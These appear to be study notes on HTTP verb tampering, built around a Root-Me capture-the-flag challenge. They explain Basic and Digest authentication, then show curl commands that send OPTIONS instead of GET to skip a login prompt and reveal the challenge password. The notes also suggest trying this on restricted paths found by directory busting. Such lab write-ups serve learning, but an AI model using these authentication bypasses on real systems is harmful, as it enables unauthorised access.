# HTTP - Verb tampering



Summary:

1. when there's authentication pop up, use http verb tampering
2. After finding some directories with directory busting program, visit 401 and 403 with this way.

***

Info

HTTP Authentication: Basic and Digest Access Authentication

Positioning at the Internet Layer: HTTP-Authentication is part of the HTTP-Protocol. The HTTP-Protocol is positioned at Layer 5/Layer 6.

if one tries to enter the page -> authentication page pops up -> if the user enters credential -> server sends back either 403 or 200/302

***

Practical Request

GET **/web-serveur/ch8/** HTTP/1.1 Host: challenge01.root-me.org User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: \_ga\_SRYSKX09J7=GS1.1.1661155511.14.1.1661156300.0.0.0; \_ga=GA1.1.536088429.1661133467 Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4=

where

Basic YWRtaW46YWRtaW4=

is

base64encode(admin: admin)

and

GET (directory or page you want to access)

\->

while for Digest Access Authentication:

Password won't be sent in clear text. The password will be sent encrypted (normally as md5 hash of the password and some other values)

\-> Server requests Authorisation: HTTP/1.1 401 Unauthorized WWW-Authenticate: Digest realm="Protected", qop="auth,auth-int", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", opaque="5ccc069c403ebaf9f0171e9517f40e41" -> Client replies Authorisation: Authorization: Digest username="frank", realm="Protected", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/dir/index.html", qop=auth, nc=00000001, cnonce="0a4f113b", response="6629fae49393a05397450978507c4ef1", opaque="5ccc069c403ebaf9f0171e9517f40e41"

\->

Explanation

realm: Displayed to User in Login-Formula (like at Basic Access Authentication) qop: quality of protection Is required for backward compatibility with RFC 2069

* The value "auth" indicates authentication;
* The value "auth-int" indicates authentication with integrity protection. Therefore the Hash value is calculated over the whole entity-body. nonce: server-specified quoted data string uniquely generated each time a 401 response is made. It will be used for the encryption of the username/password pair. opaque: quoted data string replied unchanged the whole session by the client; it might be used for example for session tracking by the web server. This field is optional. stale: flag set if the client or the server requests a new nonce value TRUE: - if the client wants to reauthenticate
* if the server gets an outdated nonce value but correct user/password from the client calculated with this outdated nonce value algorithm: one or more algorithms used to encrypt user/password. Normally MD5 is used to encrypt the username/password pair within the Digest Access Authentication.

***

How the response is encrypted Depending on quality of protection it’s a Hash value of various attributes: If quality of protection is “auth” and the Algorithm is MD5 the response will be calculated this way: The Response is the MD5 Hash value of various Attribute values are merged to a long String value separated by colons: Response = MD5( username-value:realm-value:password:nonce- value:nc-value:cnonce-value:qop-value:request-method- value:digest-uri-value )

***

How to bypass?

Use the http verb other than GET:

└─$ **curl -X OPTIONS http://challenge01.root-me.org/web-serveur/ch8/**

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>
```

* curl -X (VERB) host
* curl -I HEAD http://redacted/cgi-bin/abcd.cgi?tmenu=main\_frame\&smenu=main\_frame
